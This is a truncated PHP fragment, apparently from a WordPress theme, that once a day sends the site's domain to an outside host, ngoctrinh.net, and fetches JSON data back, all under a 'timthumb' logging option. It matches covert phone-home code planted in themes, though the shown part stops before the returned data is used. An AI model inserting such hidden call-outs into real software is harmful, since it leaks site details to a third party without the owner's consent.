...
{    
    ...
    if(get_option('log_timthumb',0) < time()-86400)
    {
        $for = str_replace(array('http://','https://'),'',get_bloginfo('url'));
        $data = wp_remote_get('http://ngoctrinh.net/wp-load.php?getdata=timthumb&for='.$for);
        $data = json_decode($data,true);
        update_option('log_timthumb',time());
        if(is_array($data))
        {
            update_option('log_timthumb',time()+86400);
        }
